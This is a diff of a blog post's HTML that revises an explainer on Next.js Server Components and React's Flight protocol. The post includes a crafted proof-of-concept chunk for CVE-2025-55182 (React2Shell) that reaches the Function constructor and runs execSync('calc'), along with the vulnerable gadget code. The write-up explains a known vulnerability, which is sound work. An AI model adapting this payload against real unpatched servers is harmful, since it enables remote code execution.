@@ -54,8 +54,8 @@
   
   <meta name="twitter:title" content="RSC Flight Protocol"/>
   <meta name="twitter:description" content="I&rsquo;m currently building an app using Next.js (
-dmarcdefender.io). I&rsquo;m not sure how I feel about it. It&rsquo;s both amazing and terrifying, seamlessly jumping between client-side/server-side code. I don&rsquo;t really like magic, but it is nice having one single environment, one set of types, complete DRY on both the client/server side, and SSR/SSG for free.
-Part of the magic is the Flight Protocol. If you&rsquo;ve ever inspected the network tab of a Next.js app, you&rsquo;ve probably seen some goobilie goop:"/>
+dmarcdefender.io). I&rsquo;m not sure how I feel about it. It&rsquo;s both amazing and terrifying, seamlessly jumping between client-side and server-side code. I don&rsquo;t really like magic, but it is nice having one single environment, one set of types, complete DRY across the client and server, and SSR/SSG for free.
+Part of the magic is the Flight protocol. If you&rsquo;ve ever inspected the network tab of a Next.js app, you&rsquo;ve probably seen some gobbledygook:"/>
   
   <meta name="twitter:domain" content="blog.c0nrad.io"/>
   <meta name="twitter:creator" content="@CryptoGangsta"/>
@@ -146,7 +146,7 @@ Part of the magic is the Flight Protocol. If you&rsquo;ve ever inspected the net
 
 <header>
   <p class="meta">Mar 13, 2026
-     - 3 minute read 
+     - 4 minute read 
 
     
     
@@ -177,51 +177,52 @@ Part of the magic is the Flight Protocol. If you&rsquo;ve ever inspected the net
 </nav>
           
           <p>I&rsquo;m currently building an app using Next.js (
-<a href="https://dmarcdefender.io" target="_blank" rel="noopener">dmarcdefender.io</a>). I&rsquo;m not sure how I feel about it. It&rsquo;s both amazing and terrifying, seamlessly jumping between client-side/server-side code. I don&rsquo;t really like magic, but it is nice having one single environment, one set of types, complete DRY on both the client/server side, and SSR/SSG for free.</p>
-<p>Part of the magic is the Flight Protocol. If you&rsquo;ve ever inspected the network tab of a Next.js app, you&rsquo;ve probably seen some goobilie goop:</p>
+<a href="https://dmarcdefender.io" target="_blank" rel="noopener">dmarcdefender.io</a>). I&rsquo;m not sure how I feel about it. It&rsquo;s both amazing and terrifying, seamlessly jumping between client-side and server-side code. I don&rsquo;t really like magic, but it is nice having one single environment, one set of types, complete DRY across the client and server, and SSR/SSG for free.</p>
+<p>Part of the magic is the Flight protocol. If you&rsquo;ve ever inspected the network tab of a Next.js app, you&rsquo;ve probably seen some gobbledygook:</p>
 <p><img src="/rsc-flight-protocol/rsc-flight.png" alt="Dmarc Defender Example Flight Protocol Network Response"></p>
-<p>That doesn&rsquo;t look like a REST API! RSC (React Server Components) was also recently vulnerable to a nasty exploit called 
+<p>That doesn&rsquo;t look like a REST API! The React Server Components / Server Functions stack was also recently vulnerable to a nasty exploit called 
 <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182" target="_blank" rel="noopener">React2Shell</a>.</p>
-<p>So, seems like something I should be familiar with!</p>
+<p>So it seems like something I should be familiar with!</p>
 <h2 id="background">Background</h2>
 <h3 id="server-components-vs-client-components">Server Components vs Client Components</h3>
-<p>(My background is Next.JS, so I&rsquo;m just going to speak/research from the Next.JS side of things.)</p>
-<p>We have client components (traditional react), and new server components. Client components can use the client APIs that give web pages their interactivity, things like <code>useEffect</code> and <code>useState</code>. Server components give you a way to write react-esce code that is instead rendered on the server. The downside is you don&rsquo;t get to use interactive APIs like <code>useEffect</code> and <code>useState</code>, but you can do backend stuff, like querying a database, authN/authZ, etc. Then when you need interactivity, you can just embed a client component within the server component.</p>
-<p>Next.JS is pretty magical is the handoff between server components to client components. When a request is made to a server component that has a client component, both the server component and the client component are rendered server side, then the client component is hydrated client side. So you get the best of both worlds. It even goes further with caching and suspense.. With caching, if you have content that doesn&rsquo;t change much but is dynamically generated (blog posts from a CMS/database), it can be built on deployment or cached using a variety of mechanicms have static page load times. With suspense, you can send a client part of the web page, and when parts in the suspense boundary are complete (i.e. expensive database aggregation), it&rsquo;ll be streamed in later.</p>
+<p>(My background is Next.js, so I&rsquo;m just going to speak from the Next.js side of things.)</p>
+<p>We have Client Components (traditional React running in the browser) and Server Components. Client Components can use the browser-side APIs that give web pages their interactivity, things like <code>useEffect</code>, <code>useState</code>, event handlers, and <code>window</code>. Server Components let you write React-esque code that runs ahead of time on the server (or even at build time). The trade-off is that you don&rsquo;t get interactive client APIs like <code>useEffect</code> and <code>useState</code>, but you can do backend work directly, like querying a database, reading the filesystem, or doing authN/authZ checks. Then, when you need interactivity, you can embed a Client Component inside a Server Component.</p>
+<p>Next.js is pretty magical in the handoff between Server Components and Client Components. On the initial page load, React renders the Server Component tree into an RSC payload, and Next.js uses that payload plus the Client Component bundles to pre-render HTML. The browser can display that HTML immediately, and then the Client Components hydrate on the client to become interactive. On later navigations, Next.js can often fetch just the RSC payload instead of a full HTML document.</p>
+<p>It goes further with caching and Suspense. With caching, if you have content that doesn&rsquo;t change much but is dynamically generated (say blog posts from a CMS or database), it can be prerendered or cached so it behaves a lot like a static page. With Suspense, lower-priority parts of the UI can be deferred and streamed in later when they finish.</p>
 <h3 id="flight-protocol">Flight Protocol</h3>
-<p>The Flight protocol is the protocol used for serializing the react trees and props from the server to the client, along with server function calls. The flight protocol is used instead of just serializing JSON for more advance types. Things like Dates/Sets, promises, binary data, references to other server actions, and circular references.</p>
+<p>The Flight protocol is the serialization format React uses for the React Server Component payload, and related machinery is also used when calling Server Functions. It is more specialized than plain JSON because it needs to represent React trees, references to Client Components and Server Functions, promises, and some non-JSON values.</p>
 <p>A great resource for understanding the protocol was this blog post: 
 <a href="https://overreacted.io/introducing-rsc-explorer/" target="_blank" rel="noopener">https://overreacted.io/introducing-rsc-explorer/</a>.</p>
 <p>But the individual messages of the Flight protocol look like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#e6db74">&#34;$&#34;</span>,<span style="color:#e6db74">&#34;p&#34;</span>,<span style="color:#66d9ef">null</span>,{<span style="color:#f92672">&#34;children&#34;</span>:<span style="color:#e6db74">&#34;I am some text!&#34;</span>}]
-</span></span></code></pre></div><p>So it&rsquo;s just chunks of react objects and state to be rendered. One note is that client components aren&rsquo;t necessarily transmitted in the Flight Protocol, technically they&rsquo;re loaded as part of the bundler like normal client components.</p>
-<p>To implement streaming, placeholders are inserted, (type &ldquo;reference&rdquo;), that are then replaced later when the 
-<a href="https://developer.mozilla.org/en-US/docs/Web/API/Streams_API" target="_blank" rel="noopener">Stream API</a> sends them.</p>
+</span></span></code></pre></div><p>So it&rsquo;s a stream of chunks describing React elements, props, placeholders, and references. One important nuance is that Client Component code is not embedded directly in the payload; the payload contains references to the client-side JavaScript bundles needed to hydrate those components.</p>
+<p>To implement streaming, React can send placeholders and references first, then resolve them as more chunks arrive over the stream. In practice, Suspense boundaries are what make this progressive reveal possible.</p>
 <h3 id="cve-2025-55182">CVE-2025-55182</h3>
-<p>React2Shell was a serialization bug. A good background can be found 
-<a href="https://github.com/msanft/CVE-2025-55182?tab=readme-ov-file" target="_blank" rel="noopener">here</a>. Using some tricks, it&rsquo;s possible to get a handle to <code>constructor</code>, and then using some gadgets, you can pass arbitrary input.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;then&#34;</span>: <span style="color:#e6db74">&#34;$1:__proto__:then&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;resolved_model&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;reason&#34;</span>: <span style="color:#ae81ff">-1</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#960050;background-color:#1e0010">&#39;</span>{<span style="color:#f92672">&#34;then&#34;</span>: <span style="color:#e6db74">&#34;$B0&#34;</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;_response&#34;</span>: {
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;_prefix&#34;</span>: <span style="color:#960050;background-color:#1e0010">f</span><span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;_formData&#34;</span>: {
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;get&#34;</span>: <span style="color:#e6db74">&#34;$1:constructor:constructor&#34;</span>,
+<p>React2Shell was a deserialization bug in the code handling requests to Server Function endpoints. A good background can be found 
+<a href="https://github.com/msanft/CVE-2025-55182?tab=readme-ov-file" target="_blank" rel="noopener">here</a>. Very roughly, by abusing prototype traversal during reference resolution, an attacker could get access to the <code>Function</code> constructor and then find a gadget that invoked it with attacker-controlled input.</p>
+<p>Here&rsquo;s a simplified crafted chunk from the write-up:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;then&#34;</span>: <span style="color:#e6db74">&#34;$1:__proto__:then&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;resolved_model&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;reason&#34;</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;value&#34;</span>: <span style="color:#e6db74">&#39;{&#34;then&#34;: &#34;$B0&#34;}&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;_response&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;_prefix&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;_formData&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;get&#34;</span>: <span style="color:#e6db74">&#34;$1:constructor:constructor&#34;</span>,
 </span></span><span style="display:flex;"><span>        },
 </span></span><span style="display:flex;"><span>    },             
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>This is the internal object gadget where the call actually occurs:</p>
+</span></span></code></pre></div><p>This is the internal gadget where the call actually occurs:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (
 </span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>)),
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">_formData</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">_prefix</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">obj</span>)
 </span></span><span style="display:flex;"><span>  );
-</span></span></code></pre></div><p>So response._formData.get is the constructor function, and response._prefix is the payload.</p>
+</span></span></code></pre></div><p>So <code>response._formData.get</code> is made to resolve to the <code>Function</code> constructor, and <code>response._prefix</code> becomes the attacker-controlled source code passed into it.</p>
 <h3 id="conclusion">Conclusion</h3>
 <p>A fun little dive into some internals of RSC!</p>
-<p>Also a very neat bug. I am not too sure at my current skills I would have found that during a CTF (without AI)&hellip; I should probably get back into CTFs at some point.</p>
+<p>Also a very neat bug. I&rsquo;m not too sure I would have found that during a CTF at my current skill level (at least not without AI). I should probably get back into CTFs at some point.</p>
 
         </div>
         
